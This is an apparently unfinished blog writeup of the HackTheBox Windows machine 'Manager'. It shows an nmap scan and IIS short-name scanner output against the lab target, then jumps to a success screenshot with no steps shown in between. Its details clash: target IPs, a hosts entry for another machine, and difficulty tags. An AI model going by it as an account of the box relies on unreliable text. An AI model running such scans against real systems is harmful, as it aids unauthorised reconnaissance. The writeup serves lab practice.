---
layout: post
title: Manager HackTheBox Machine - Writeup
categories: [HackTheBox Machines]
tags: [hackthebox,web,hackthebox easy,windows]
img_path: /images/htb/medium/manager/
image:
  path: icon.png
---

My first ever windows machine... Wish me luck!

**Machine created by:** [Geiseric](https://app.hackthebox.com/users/184611)

## Recon

Let's start with a port scan:

```
$ sudo nmap 10.10.11.221 --top-ports 2500
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 21:18 AEDT
Nmap scan report for 10.10.11.236
Host is up (0.046s latency).
Not shown: 2486 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

Let's setup an entry in `/etc/hosts`

```
10.10.11.221 2million.htb
```

Visiting [10.10.11.236:80](http://10.10.11.236:80/) shows a basic IIS 10.0 server.

After some looking at IIS vulnerabilities, I found the webserver is vulnerable [IIS ShortName](https://github.com/irsdl/IIS-ShortName-Scanner).

```
java -jar iis_shortname_scanner.jar 2 20 http://10.10.11.236/
useProvidedUrlWithoutChange: false
magicFileName: *~1*
requestMethodDelimiter: ,
requestMethod: OPTIONS,POST,DEBUG,TRACE,GET,HEAD
nameStartsWith: Default
extStartsWith: Default
hassleFree: false
cookies: Default
outputFile: iis_shortname_scanner_logfile.txt
proxyServerName: Default
acceptableDifferenceLengthBetweenResponses: 5
proxyServerPort: Default
magicFinalPartList: /~1/.rem,/~1/,\a.aspx,\a.asp,/a.aspx,/a.asp,/a.shtml,/a.asmx,/a.ashx,/a.config,/a.php,/a.jpg,/webresource.axd,/a.xxx
minVulnerableCheckRepeat: 3
headersDelimiter: @@
saveOutput: false
maxNumericalPart: 4
headers: Default
debug: false
maxConnectionTimeOut: 60000
magicFinalPartDelimiter: ,
forceNumericalPart: 1
userAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
inScopeCharacters: ETAONRISHDLFCMUGYPWBVKJXQZ0123456789_-$~()&!#%'@^`{}
ignoreHeaderLevel: 2
asteriskSymbol: *
showActualNames: true
maxRetryTimes: 10
maxDelayAfterEachRequest: 1
URLSuffix: Default
magicFileExtension: *
questionMarkSymbol: ?
performUrlEncoding: false
ignoreBodyLevel: 1

-- Current Configuration -- Begin
Scan Mode: ALL
Number of threads: 20
Config file: config.xml
Scanner version: 2023.4
-- Current Configuration -- End
Max delay after each request in milliseconds = 1
Do you want to use proxy [Y=Yes, Anything Else=No]? n
No proxy has been used.

Scanning...

Testing request method: "OPTIONS" with magic part: "/~1/.rem" ...
Early result: the target is probably vulnerable.
Early result: identified letters in names > A,B,C,D,E,I,N,O,R,S,T,U,V,W,X
Early result: identified letters in extensions > C,H,I,M,N,O,P,T,Z
File: WEB~1.CON
File: ABOUT~1.HTM
File: CONTAC~1.HTM
File: INDEX~1.HTM
File: SERVIC~1.HTM
File: WEBSIT~1.ZIP
[-] WEBSIT~1.ZIZ
# IIS Short Name (8.3) Scanner version 2023.4 - scan initiated 2024/01/05 21:44:32
Target: http://10.10.11.236/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/.rem
|_ Extra information:
  |_ Number of sent requests: 825
  |_ Identified directories: 0
  |_ Identified files: 6
    |_ ABOUT~1.HTM
      |_ Actual file name = ABOUT
    |_ CONTAC~1.HTM
    |_ INDEX~1.HTM
      |_ Actual file name = INDEX
    |_ SERVIC~1.HTM
    |_ WEBSIT~1.ZIP
    |_ WEB~1.CON
      |_ Actual file name = WEB

Finished in: 7 second(s)
```




![Success](submitted.png)

## Thanks for reading!
Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev) and [LinkedIn](https://www.linkedin.com/in/noah-cooper-5442ab309/).

You can also find my other contacts on the [whoami](../about) page.